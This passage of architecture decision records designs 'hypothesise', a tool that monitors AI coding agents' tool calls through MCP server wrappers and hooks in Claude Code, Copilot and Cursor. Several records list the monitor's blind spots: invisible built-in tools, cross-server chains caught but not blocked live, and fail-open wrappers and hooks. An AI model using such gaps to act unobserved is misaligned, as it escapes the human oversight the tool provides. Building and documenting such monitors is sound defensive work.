*Spelling.* British `-ise`, matching the brand. `hypothesize` (US) is an
unrelated statistics package on PyPI and `hypothesis` is a widely used testing
library; the README warns about both. The landing page in `Claude outputs/`
still says `pip install hypothesize-agent` and needs updating separately.

*Distribution.* Users install it as a tool — `uv tool install hypothesise` or
`pipx install hypothesise` — into its own environment. Plain `pip install`
works inside a virtualenv, but on Homebrew Python and most Linux distributions
the system interpreter refuses it (PEP 668, ADR-014), so the README leads with
the tool installers. The license stays `UNLICENSED` until ADR-007 closes.

*Packaging fixes found while building it for real:* the uv workspace globbed
`packages/*`, which matched `packages/adapters` (not a package) and made **every
uv command fail**, including `uv tool install` from a checkout; the sdist's
unanchored include patterns swept in `.kilo/` and `redteam/`; and the wheel did
not contain the scenario suite, so `hypothesise api --demo` was empty for
anyone who installed it. All three fixed and pinned by `test_packaging.py`.

---

### ADR-035 — Local-first: proxies and hooks spool; the dashboard is optional
**Date:** 2026-10-07 · **Status:** accepted · amends ADR-015

*Problem.* With no `apiUrl`, the proxy decided inline and then threw the event
away. Anyone who installed the tool and did not keep `hypothesise api` running
recorded nothing, and an always-on dashboard is not something people do.

*Decision.* With no control plane configured, events go to an append-only
JSON-lines spool in `~/.hypothesise/spool/` under a short cross-process lock
(fcntl on POSIX, msvcrt on Windows). The dashboard reads it on start and every
two seconds, through the same `ingest()` as `POST /v1/events`
(`hypothesise_store/ingest.py`), so a spooled event and a shipped event are
decided identically.

*Why a file and not SQLite.* Many short-lived writers — one proxy per wrapped
server per app, one hook process per Claude Code tool call — and SQLite locking
is unreliable on the removable and network volumes this very repo lives on.
Appending a line is the cheapest write that is safe from all of them, and it
needs only the standard library, which keeps the hook at ~55 ms.

*Guarantees kept.* Never on the request path (a background task, like the
shipper). Bounded (200 MB, then drop). Never raises. The reader commits its
offset only after ingest, so a crash re-reads instead of losing; a half-written
trailing line is left for the next read; duplicates are skipped by event id.

---

### ADR-036 — `hypothesise init`: wrap MCP servers in place; hook Claude Code
**Date:** 2026-10-07 · **Status:** accepted · supersedes the single-proxy client setup in ADR-032 for end users

*Problem.* Setup meant moving a client's `mcpServers` into
`hypothesise.config.json` and pointing the client at one proxy. That renames
every tool (`mcp__hypothesise__create_issue` instead of
`mcp__github__create_issue`), breaks permission allowlists written against
the old names, loses VS Code's `${input:...}` substitution, and is a manual
JSON edit per app — too much for anyone who is not us.

*Decision — Claude Desktop, Cursor, VS Code.* Each stdio server entry is
wrapped where it is: same key, same env, same type; only the command changes to
`<python> -m hypothesise wrap --client C --server S -- <original command>`.
Names do not change, the app still substitutes its own variables, and the
original command rides along after `--`, so `uninstall` needs no saved state.
Files are backed up first and written atomically; a file with comments (JSONC)
is reported and left alone; remote http/sse servers are listed and skipped.

All servers wrapped for one app share a session id derived from the app's
process id, so the dashboard sees cross-server chains as one session. The
inline engine runs per server, so such a chain is **caught in the dashboard,
not blocked live** — stated plainly in the README.

*Decision — Claude Code.* Not wrapped. A PostToolUse hook in
`~/.claude/settings.json` sees built-in tools (Bash, Read, Edit, WebFetch) *and*
MCP tools under Claude's own session id — strictly more than wrapping, and the
only way to see the built-ins at all. Observe-only, exit 0 always.

*Failure behaviour.* If the wrapper cannot start, it runs the original server
unwrapped: a broken security layer costs its protection, not the user's tool.
Enforce mode with no control plane downgrades to observe with a warning rather
than refusing to start — refusing would take the user's server down with it.

*Interpreter.* Entries name the interpreter of the installed tool. `init`
refuses to run from a temporary one (`uvx`, `pipx run`), which would vanish on
the next cache clean and break every wrapped server.

---

### ADR-037 — Two ways to connect, both first-class: the proxy entry and `init`
**Date:** 2026-10-07 · **Status:** accepted · amends ADR-036

*Problem.* ADR-036 made `init` the way in, and treated the original setup — one
hand-written entry, `python -m hypothesise proxy --config hypothesise.config.json
--detect --api http://127.0.0.1:8080`, fronting several servers and shipping
live to the dashboard — as something to remove. That was the setup the `uris`
dogfood run actually used, and the one that showed threat levels live. Losing
it was a regression.

*Decision.* Both are supported, side by side, even in one config file:

| | Proxy entry (original) | `init` (wrapped in place) |
|---|---|---|
| Written by | hand, or `scripts/ops/check-client-config.py` | `hypothesise init` |
| Shape | one server named e.g. `hypothesise`, tools of every upstream | each server keeps its own name |
| Events | live to the dashboard (`--api`) | spool, read by the dashboard |
| Dashboard down | spooled, not dropped (`Shipper.spool_fallback`) | spooled |
| Cross-server chains | caught **inline** — one engine sees every upstream | caught in the dashboard |
| Approvals / enforce | yes | needs `HYPOTHESISE_API_URL` |

*What `init` does with proxy entries.* A current one (`-m hypothesise proxy`,
`-m hypothesise_proxy`, or the console scripts) is recognised as connected and
left alone; `status` lists it; `uninstall` never removes it. A pre-rename one
(`-m weaver …`, `-m weaver_proxy`, `weaver`/`weaver-proxy` scripts) is
**upgraded in place**: module renamed, `weaver.config.json` pointed at
`hypothesise.config.json` when that exists, interpreter kept if it can import
`hypothesise` and replaced with init's own otherwise (ADR-032).

*Compatibility kept at the edges.* `--config weaver.config.json` finds
`hypothesise.config.json` beside it (and vice versa); the `"weaver"` key in a
config file is still read; and the first run copies `~/.weaver/weaver.db` to
`~/.hypothesise/hypothesise.db` if the new one does not exist — copied, never
moved, never overwriting — so earlier dashboard history survives the rename.

---

### ADR-038 — A Copilot agent hook for the tools VS Code will not let you turn off
**Date:** 2026-10-07 · **Status:** accepted · amends ADR-036

*Finding from the first uris run after the rename.* Copilot answered "read the
env file" with its built-in `view` tool. In VS Code's tool picker the Copilot
built-ins (`view`, `bash`, `create`, `edit`, `apply_patch`…) are marked
**Always Available** — they cannot be unticked — and they never touch MCP. So
the most natural prompts produced no events at all, while database questions
(no built-in SQL tool) always did.

*Decision.* VS Code has agent hooks with the same PostToolUse payload as
Claude Code (`session_id`, `tool_name`, `tool_input`, `tool_response`). `init`
writes a user-level `~/.copilot/hooks/hypothesise.json` running
`<python> -m hypothesise hook vscode`; `uninstall` deletes it. The receiver is
the Claude Code one with a tool-name table for Copilot's names, current and
older (`view`/`read_file`, `bash`/`run_in_terminal`, `fetch_webpage`…). Events
record as agent `copilot`, session `vs-<chat session>`.

*No double counting.* Copilot's MCP calls (`mcp_…`) are skipped by the hook —
they already pass through the wrapped servers or the proxy entry.

*Caveats.* VS Code hooks are a preview feature behind `chat.useHooks` (on by
default). Copilot's `view` argument shape is inferred, not documented; the
first real run should confirm the resource column is filled. Cursor has no
equivalent, so its built-ins remain invisible.

---

### ADR-039 — Ownership: Siddhant owns the code and the PyPI project
**Date:** 2026-10-08 · **Status:** accepted · resolves ADR-007

The code lives at `github.com/siddhant-shahhh/Hypothesise` and is published to
PyPI as `hypothesise` from Siddhant's account, via trusted publishing from that
repo (`docs/DEPLOY-PYPI.md`). Contributors push through his repo; Siddhant is
the PyPI *Owner* and approves releases through the `pypi` GitHub environment.

Still open: the **license** (`pyproject.toml` says `UNLICENSED`). It is now
Siddhant's call and must be set before the first upload, because an upload is
permanent.

---

### ADR-040 — 0.1.0a2: fixes from the first Windows install, Cursor hook, Antigravity
**Date:** 2026-10-11 · **Status:** accepted · amends ADR-036, ADR-038

Findings from the first install of the published 0.1.0a1 on Windows:

1. **Hook commands were quoted, and PowerShell cannot run them.** `init` wrote
   `"C:/…/python.exe" -m hypothesise hook vscode`. cmd and sh accept a quoted
   path followed by arguments; PowerShell — which VS Code uses for hooks on
   Windows — rejects it as a parse error. Hooks fail silently by design, so
   Copilot's activity simply never arrived. Commands are now unquoted
   (`shell_safe_exe`): paths without spaces as-is, Windows paths with spaces
   via their 8.3 short name, quoting only as a last resort. Re-running `init`
   **repairs** an outdated hook instead of reporting "already connected".
2. **`--demo` wrote sample sessions into the real database**, where they stayed
   and read as real activity. It now uses `~/.hypothesise/demo.db`, recreated
   each time, and does not drain the spool (which would have moved real events
   into the throwaway database).
3. **Port 8080 inside a Windows reserved range** produced a raw WinError. The
   dashboard now checks the port first and moves to the next free one, saying
   so; if none of 21 is free it explains the likely cause.

Added:

- **Cursor hook.** Cursor has a hook system (cursor.com/docs/hooks); `init`
  adds a `postToolUse` entry to `~/.cursor/hooks.json` beside the user's own
  hooks and `uninstall` removes only ours. Cursor's payload says
  `conversation_id` and `tool_output`, and it expects a JSON reply, so the
  receiver has a Cursor mode. MCP calls are skipped (`mcp_…` names) because
  the wrapped servers record them. Agent id `cursor`, session `cu-…`.
- **Antigravity.** Its MCP servers live in `~/.gemini/config/mcp_config.json`
  (earlier: `~/.gemini/antigravity/mcp_config.json`) in the familiar
  `mcpServers` shape, and are wrapped like Cursor's. Antigravity documents no
  hooks, so its built-in tools stay invisible.

Unverified until a real run: Cursor's exact MCP tool-name prefix (the skip
assumes `mcp_`), and whether Cursor also loads our Claude Code hook as a
"third-party hook", which would record its calls twice under two agent ids.
